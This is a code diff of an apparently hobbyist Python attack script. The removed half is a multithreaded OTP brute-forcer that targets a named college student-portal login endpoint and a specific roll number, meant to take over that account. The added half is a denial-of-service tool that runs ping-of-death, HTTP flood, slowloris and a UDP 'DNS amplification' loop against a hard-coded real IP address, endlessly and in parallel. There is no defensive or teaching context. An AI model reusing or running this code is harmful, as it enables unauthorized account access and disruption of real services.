@@ -1,98 +1,84 @@
-import requests
-import concurrent.futures
-import colorama
-from colorama import init, Fore, Style
+import socket
+import threading
 import time
+import random
+import string
+from scapy.all import *
 
-init(autoreset=True)
+# Target IP and port
+target_ip = "54.159.179.237"
+http_port = 80
+dns_port = 53
 
-print(f"{Fore.YELLOW} ________        __                __                      __           ")
-print(f"{Fore.YELLOW}/        |      /  |              /  |                    /  |          ")
-print(f"{Fore.YELLOW}$$$$$$$$/   ____$$ | __   __   __ $$/   _______   ______  $$ | __    __ ")
-print(f"{Fore.YELLOW}$$ |__     /    $$ |/  | /  | /  |/  | /       | /      \ $$ |/  |  /  |")
-print(f"{Fore.YELLOW}$$    |   /$$$$$$$ |$$ | $$ | $$ |$$ |/$$$$$$$/ /$$$$$$  |$$ |$$ |  $$ |")
-print(f"{Fore.YELLOW}$$$$$/    $$ |  $$ |$$ | $$ | $$ |$$ |$$      \ $$    $$ |$$ |$$ |  $$ |")
-print(f"{Fore.YELLOW}$$ |_____ $$ \__$$ |$$ \_$$ \_$$ |$$ | $$$$$$  |$$$$$$$$/ $$ |$$ \__$$ |")
-print(f"{Fore.YELLOW}$$       |$$    $$ |$$   $$   $$/ $$ |/     $$/ $$       |$$ |$$    $$ |")
-print(f"{Fore.YELLOW}$$$$$$$$/  $$$$$$$/  $$$$$/$$$$/  $$/ $$$$$$$/   $$$$$$$/ $$/  $$$$$$$ |")
-print(f"{Fore.YELLOW}                                                              /  \__$$ |")
-print(f"{Fore.YELLOW}                                                              $$    $$/ ")
-print(f"{Fore.YELLOW}                                                               $$$$$$/ ")
+# Ping of Death
+def ping_of_death():
+    while True:
+        ip = IP(dst=target_ip)
+        icmp = ICMP()
+        raw = Raw(b'X'*65500)
+        packet = ip / icmp / raw
+        send(fragment(packet), verbose=0)
+        time.sleep(1)
 
-print("   \n                                      \033[95m(-Developed by <Solitary>)\033[0m")
-
-print(f"{Fore.RED}\033[1mBefore running this Application,\033[0m")
-print(f"{Fore.RED}Make sure to visit the website, Enter your register number and Click <Login using OTP> in the next page.")
-print(f"{Fore.RED}Let this project find out the OTP for you.")
-print(f"{Fore.RED}After the program gives out the correct OTP, Immediately login with it.")
-print(f"{Fore.RED}Since the OTP is valid only for 10 minutes.")
-
-url = 'https://dbchangesstudent.edwisely.com/auth/v3/getUserDetails'
-
-params = {
-    'roll_number': '111723104080',
-    'otp': ''
-}
-
-headers = {
-    'Sec-Ch-Ua': '"Brave";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
-    'Accept': 'application/json, text/plain, */*',
-    'Sec-Ch-Ua-Mobile': '?0',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
-    'Sec-Ch-Ua-Platform': '"Windows"',
-    'Sec-Gpc': '1',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'Origin': 'https://nextgen.rmkec.ac.in',
-    'Sec-Fetch-Site': 'cross-site',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Dest': 'empty',
-    'Referer': 'https://nextgen.rmkec.ac.in/',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Priority': 'u=1, i',
-    'Connection': 'close'
-}
-
-def perform_attack():
-    num_workers = 50  
-    num_otp_per_thread = (10000 + num_workers - 1) // num_workers
-
-    correct_otps = []
-
-    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
-        future_to_range = {}
-        for i in range(0, 10000, num_otp_per_thread):
-            end = min(i + num_otp_per_thread, 10000)
-            future = executor.submit(check_otp_range, i, end)
-            future_to_range[future] = (i, end)
-
-        for future in concurrent.futures.as_completed(future_to_range):
-            try:
-                result = future.result()
-                if result:
-                    correct_otps.append(result)
-                    if len(correct_otps) == 2:
-                        print(f"\n{Fore.GREEN}OTP found: {correct_otps[1]}")
-                        break
-            except Exception as e:
-                print(f"{Fore.RED}Exception: {e}")
-
-def check_otp_range(start, end):
-    for i in range(start, end):
-        otp = f'{i:04}'
-        params['otp'] = otp
+# HTTP Flood
+def http_flood():
+    while True:
+        http_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            response = requests.get(url, params=params, headers=headers, verify=True)
-            if response.status_code == 200 and len(response.text) > 1000:  
-                return otp
-        except requests.RequestException as e:
-            print(f"{Fore.RED}Request failed for OTP {otp}: {e}")
+            http_conn.connect((target_ip, http_port))
+            data = (f"GET HTTP/1.1\nHost: {str(target_ip)}\n\n").encode()
+            http_conn.send(data)
+        except socket.error:
+            print("No connection")
+        finally:
+            http_conn.shutdown(socket.SHUT_RDWR)
+            http_conn.close()
+        time.sleep(1)
 
-    return None
+# Slowloris
+def slowloris():
+    while True:
+        http_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            http_conn.connect((target_ip, http_port))
+            data = (f"GET HTTP/1.1\nHost: {str(target_ip)}\r\n").encode()
+            http_conn.send(data)
+            for i in range(9999):
+                data = random.choice(string.ascii_letters + string.digits)
+                data = "X-{}: {}\r\n".format(i, data).encode()
+                http_conn.send(data)
+                time.sleep(random.uniform(0.1, 3))
+            http_conn.close()
+        except KeyboardInterrupt:
+            print("\nExiting...")
+            break
+        except Exception as e:
+            continue
+        time.sleep(1)
 
-perform_attack()
+# DNS Amplification
+def dns_amplification():
+    while True:
+        dns_conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            dns_conn.sendto(b"DNS request", (target_ip, dns_port))
+        except socket.error:
+            print("No connection")
+        finally:
+            dns_conn.close()
+        time.sleep(1)
 
+# Create threads for each attack
+threads = []
+threads.append(threading.Thread(target=ping_of_death))
+threads.append(threading.Thread(target=http_flood))
+threads.append(threading.Thread(target=slowloris))
+threads.append(threading.Thread(target=dns_amplification))
+
+# Start threads
+for t in threads:
+    t.start()
+
+# Run indefinitely
 while True:
-    time.sleep(1)
-
-
-    
+    pass
